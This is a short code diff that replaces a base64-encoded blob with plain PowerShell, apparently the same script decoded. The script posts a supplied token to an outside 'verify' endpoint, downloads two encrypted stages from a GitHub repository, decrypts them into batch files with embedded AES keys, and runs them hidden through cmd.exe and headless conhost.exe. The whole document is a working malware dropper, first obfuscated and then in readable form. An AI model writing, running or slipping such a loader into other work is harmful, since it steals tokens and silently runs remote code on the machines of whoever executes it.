@@ -1,1 +1,49 @@
-aWYgKC1ub3QgJHRva2VuKSB7CiAgICAgICBXcml0ZS1Ib3N0ICJObyB0b2tlbiBwcm92aWRlZC4gRXhpdGluZy4iCiAgICAgICBleGl0IDEKICAgfQoKICAgJGVuZHBvaW50ID0gImh0dHBzOi8vdGVlbmRyaXZlLnh5ei9hcGkvdmVyaWZ5IgogICAkYm9keSA9IEB7IHRva2VuID0gJHRva2VuIH0gfCBDb252ZXJ0VG8tSnNvbgoKICAgdHJ5IHsKICAgICAgICRyZXNwb25zZSA9IEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJGVuZHBvaW50IC1NZXRob2QgUG9zdCAtQm9keSAkYm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICBXcml0ZS1Ib3N0ICJWZXJpZmljYXRpb24gc2VudCEgU2VydmVyIHJlc3BvbnNlOiIgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgICAgV3JpdGUtSG9zdCAkcmVzcG9uc2UKICAgfSBjYXRjaCB7CiAgICAgICBXcml0ZS1Ib3N0ICJWZXJpZmljYXRpb24gZmFpbGVkLiBFcnJvcjoiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAgICBXcml0ZS1Ib3N0ICRfCiAgIH0KCiR1cmxzID0gQCgKICAgIEB7dXJsPSJodHRwczovL2dpdGh1Yi5jb20vVGVlbkRyaXZlL1RlZW5Ecml2ZS9yYXcvcmVmcy9oZWFkcy9tYWluL3N0YWdlMSI7IG91dD0iYmF0Y2gxLmVuYyI7IGRlYz0iYmF0Y2gxLmJhdCI7IGtleT0iNGJ4WEFCSU4xeDdjQmpWRnQvNzg3RjkzMUFYamdqcDZ0U0kvdWIzR2E3UT0iOyBpdj0iVml1dTVHNndpU1YzQ0VBaWhsSEcvdz09In0sCiAgICBAe3VybD0iaHR0cHM6Ly9naXRodWIuY29tL1RlZW5Ecml2ZS9UZWVuRHJpdmUvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdGFnZTIiOyBvdXQ9ImJhdGNoMi5lbmMiOyBkZWM9ImJhdGNoMi5iYXQiOyBrZXk9Im9UNTgrVlJrMEkwMStXMzQzbHBTbC9TcE1hSnlteCtOMG9PNGlKVlBJVU09IjsgaXY9IkNhWmN5a2VoOENyNXBrdW9PVHdkZHc9PSJ9CikKJHRlbXAgPSAkZW52OlRFTVAKCmZ1bmN0aW9uIEQoW3N0cmluZ10kdSxbc3RyaW5nXSRvLFtzdHJpbmddJGQsW3N0cmluZ10kayxbc3RyaW5nXSRpKSB7CiAgICBJbnZva2UtV2ViUmVxdWVzdCAkdSAtT3V0RmlsZSAkbwogICAgJGtleSA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkaykKICAgICRpdiA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkaSkKICAgICRhZXMgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNdOjpDcmVhdGUoKQogICAgJGFlcy5LZXlTaXplID0gMjU2CiAgICAkYWVzLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzLlBhZGRpbmcgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06OlBLQ1M3CiAgICAkYWVzLktleSA9ICRrZXkKICAgICRhZXMuSVYgPSAkaXYKICAgICRkZWMgPSAkYWVzLkNyZWF0ZURlY3J5cHRvcigpCiAgICAkZW5jID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJG8pCiAgICAkbXMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbQogICAgJGNzID0gTmV3LU9iamVjdCBTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ3J5cHRvU3RyZWFtKCRtcywgJGRlYywgW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW1Nb2RlXTo6V3JpdGUpCiAgICAkY3MuV3JpdGUoJGVuYywgMCwgJGVuYy5MZW5ndGgpCiAgICAkY3MuQ2xvc2UoKQogICAgW0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRkLCAkbXMuVG9BcnJheSgpKQp9Cgpmb3JlYWNoICgkaXRlbSBpbiAkdXJscykgewogICAgJG91dCA9IEpvaW4tUGF0aCAkdGVtcCAkaXRlbS5vdXQKICAgICRkZWMgPSBKb2luLVBhdGggJHRlbXAgJGl0ZW0uZGVjCiAgICBEICRpdGVtLnVybCAkb3V0ICRkZWMgJGl0ZW0ua2V5ICRpdGVtLml2CiAgICBTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50TGlzdCAiL2MgYCIkZGVjYCIiIC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgIFN0YXJ0LVByb2Nlc3MgY29uaG9zdC5leGUgLUFyZ3VtZW50TGlzdCAiLS1oZWFkbGVzcyBgIiRkZWNgIiIKfQo=
+if (-not $token) {
+       Write-Host "No token provided. Exiting."
+       exit 1
+   }
+
+   $endpoint = "https://teendrive.xyz/api/verify"
+   $body = @{ token = $token } | ConvertTo-Json
+
+   try {
+       $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $body -ContentType "application/json"
+       Write-Host "Verification sent! Server response:" -ForegroundColor Green
+       Write-Host $response
+   } catch {
+       Write-Host "Verification failed. Error:" -ForegroundColor Red
+       Write-Host $_
+   }
+
+$urls = @(
+    @{url="https://github.com/TeenDrive/TeenDrive/raw/refs/heads/main/stage1"; out="batch1.enc"; dec="batch1.bat"; key="4bxXABIN1x7cBjVFt/787F931AXjgjp6tSI/ub3Ga7Q="; iv="Viuu5G6wiSV3CEAihlHG/w=="},
+    @{url="https://github.com/TeenDrive/TeenDrive/raw/refs/heads/main/stage2"; out="batch2.enc"; dec="batch2.bat"; key="oT58+VRk0I01+W343lpSl/SpMaJymx+N0oO4iJVPIUM="; iv="CaZcykeh8Cr5pkuoOTwddw=="}
+)
+$temp = $env:TEMP
+
+function D([string]$u,[string]$o,[string]$d,[string]$k,[string]$i) {
+    Invoke-WebRequest $u -OutFile $o
+    $key = [Convert]::FromBase64String($k)
+    $iv = [Convert]::FromBase64String($i)
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.KeySize = 256
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aes.Key = $key
+    $aes.IV = $iv
+    $dec = $aes.CreateDecryptor()
+    $enc = [IO.File]::ReadAllBytes($o)
+    $ms = New-Object IO.MemoryStream
+    $cs = New-Object Security.Cryptography.CryptoStream($ms, $dec, [Security.Cryptography.CryptoStreamMode]::Write)
+    $cs.Write($enc, 0, $enc.Length)
+    $cs.Close()
+    [IO.File]::WriteAllBytes($d, $ms.ToArray())
+}
+
+foreach ($item in $urls) {
+    $out = Join-Path $temp $item.out
+    $dec = Join-Path $temp $item.dec
+    D $item.url $out $dec $item.key $item.iv
+    Start-Process cmd.exe -ArgumentList "/c `"$dec`"" -WindowStyle Hidden
+    Start-Process conhost.exe -ArgumentList "--headless `"$dec`""
+}
